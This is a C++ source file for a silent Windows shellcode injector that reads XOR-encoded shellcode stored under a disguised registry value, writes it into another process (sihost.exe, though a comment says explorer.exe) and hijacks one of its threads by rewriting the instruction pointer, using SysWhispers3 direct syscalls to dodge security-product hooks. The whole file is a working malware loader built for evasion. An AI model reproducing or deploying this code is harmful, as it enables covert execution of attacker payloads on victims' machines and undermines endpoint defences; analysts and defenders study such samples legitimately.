// injector.cpp
// Thread-hijack shellcode injector using SysWhispers3 (jumper_randomized).
// - Shellcode read from HKCU\Software\Macromedia\FlashPlayer\Config (REG_BINARY)
// - Value stored XOR'd with 0x6B by PowerShell, we XOR again to recover it
// - Hijacks an existing thread in explorer.exe (no CreateRemoteThread)
// - Fully silent: no console, no prints.

#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <tlhelp32.h>
#include <stdlib.h>
#include <time.h>
#include <vector>

#include "syscalls.h"

#pragma comment(lib, "advapi32.lib")

// -----------------------------------------------------------------------------
// Config
// -----------------------------------------------------------------------------
#define XOR_KEY             0x6B
#define REG_SUBKEY          L"Software\\Macromedia\\FlashPlayer"
#define REG_VALUE_NAME      L"Config"
#define TARGET_PROCESS      L"sihost.exe"

// -----------------------------------------------------------------------------
// Read the XOR'd shellcode from the registry
// -----------------------------------------------------------------------------
static std::vector<BYTE> ReadShellcodeFromRegistry()
{
    std::vector<BYTE> shellcode;
    HKEY hKey = nullptr;

    if (RegOpenKeyExW(HKEY_CURRENT_USER, REG_SUBKEY, 0, KEY_READ, &hKey) != ERROR_SUCCESS)
        return shellcode;

    DWORD type = 0;
    DWORD size = 0;
    if (RegQueryValueExW(hKey, REG_VALUE_NAME, nullptr, &type, nullptr, &size) != ERROR_SUCCESS
        || type != REG_BINARY || size == 0)
    {
        RegCloseKey(hKey);
        return shellcode;
    }

    shellcode.resize(size);
    if (RegQueryValueExW(hKey, REG_VALUE_NAME, nullptr, nullptr, shellcode.data(), &size) != ERROR_SUCCESS)
        shellcode.clear();

    RegCloseKey(hKey);
    return shellcode;
}

// -----------------------------------------------------------------------------
// Helpers: toolhelp snapshot enumeration
// -----------------------------------------------------------------------------
static DWORD FindTargetProcessId(const wchar_t* processName)
{
    DWORD pid = 0;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32W pe{};
    pe.dwSize = sizeof(pe);
    if (Process32FirstW(snap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, processName) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return pid;
}

static DWORD FindTargetThreadId(DWORD pid)
{
    DWORD tid = 0;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    THREADENTRY32 te{};
    te.dwSize = sizeof(te);
    if (Thread32First(snap, &te)) {
        do {
            if (te.th32OwnerProcessID == pid) {
                tid = te.th32ThreadID;
                break;
            }
        } while (Thread32Next(snap, &te));
    }
    CloseHandle(snap);
    return tid;
}

// -----------------------------------------------------------------------------
// Entry point (silent, no console)
// -----------------------------------------------------------------------------
int WINAPI wWinMain(HINSTANCE, HINSTANCE, PWSTR, int)
{
    // SysWhispers3 "jumper_randomized" uses rand() inside SW3_GetRandomSyscallAddress.
    srand((unsigned int)time(nullptr) ^ GetTickCount());

    // 1. Read + decode shellcode
    std::vector<BYTE> shellcode = ReadShellcodeFromRegistry();
    if (shellcode.empty()) return 1;

    for (auto& b : shellcode) b ^= XOR_KEY;

    // 2. Locate target process
    DWORD pid = FindTargetProcessId(TARGET_PROCESS);
    if (pid == 0) return 1;

    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, nullptr, 0, nullptr, nullptr);

    // 3. NtOpenProcess
    HANDLE hProcess = nullptr;
    CLIENT_ID cid = {};
    cid.UniqueProcess = (HANDLE)(ULONG_PTR)pid;
    cid.UniqueThread  = nullptr;

    NTSTATUS status = Sw3NtOpenProcess(
        &hProcess,
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
        &oa,
        &cid);

    if (status < 0 || hProcess == nullptr) return 1;

    // 4. NtAllocateVirtualMemory
    PVOID remoteBase = nullptr;
    SIZE_T regionSize = shellcode.size();
    status = Sw3NtAllocateVirtualMemory(
        hProcess,
        &remoteBase,
        0,
        &regionSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE);

    if (status < 0 || remoteBase == nullptr) {
        Sw3NtClose(hProcess);
        return 1;
    }

    // 5. NtWriteVirtualMemory
    SIZE_T bytesWritten = 0;
    status = Sw3NtWriteVirtualMemory(
        hProcess,
        remoteBase,
        shellcode.data(),
        shellcode.size(),
        &bytesWritten);

    if (status < 0 || bytesWritten != shellcode.size()) {
        Sw3NtClose(hProcess);
        return 1;
    }

    // 6. NtProtectVirtualMemory -> RX
    ULONG oldProtect = 0;
    status = Sw3NtProtectVirtualMemory(
        hProcess,
        &remoteBase,
        &regionSize,
        PAGE_EXECUTE_READ,
        &oldProtect);

    if (status < 0) {
        Sw3NtClose(hProcess);
        return 1;
    }

    // 7. Find a thread to hijack
    DWORD tid = FindTargetThreadId(pid);
    if (tid == 0) {
        Sw3NtClose(hProcess);
        return 1;
    }

    HANDLE hThread = nullptr;
    cid.UniqueThread = (HANDLE)(ULONG_PTR)tid;

    status = Sw3NtOpenThread(
        &hThread,
        THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_QUERY_INFORMATION,
        &oa,
        &cid);

    if (status < 0 || hThread == nullptr) {
        Sw3NtClose(hProcess);
        return 1;
    }

    // 8. Suspend, patch RIP, resume
    ULONG prevSuspend = 0;
    if (Sw3NtSuspendThread(hThread, &prevSuspend) < 0) {
        Sw3NtClose(hThread); Sw3NtClose(hProcess);
        return 1;
    }

    CONTEXT ctx{};
    ctx.ContextFlags = CONTEXT_FULL;
    if (Sw3NtGetContextThread(hThread, &ctx) < 0) {
        Sw3NtResumeThread(hThread, &prevSuspend);
        Sw3NtClose(hThread); Sw3NtClose(hProcess);
        return 1;
    }

    ctx.Rip = (DWORD64)remoteBase;
    if (Sw3NtSetContextThread(hThread, &ctx) < 0) {
        Sw3NtResumeThread(hThread, &prevSuspend);
        Sw3NtClose(hThread); Sw3NtClose(hProcess);
        return 1;
    }

    if (Sw3NtResumeThread(hThread, &prevSuspend) < 0) {
        Sw3NtClose(hThread); Sw3NtClose(hProcess);
        return 1;
    }

    // Give the payload a moment to spin up before our loader exits.
    Sleep(2000);

    Sw3NtClose(hThread);
    Sw3NtClose(hProcess);
    return 0;
}
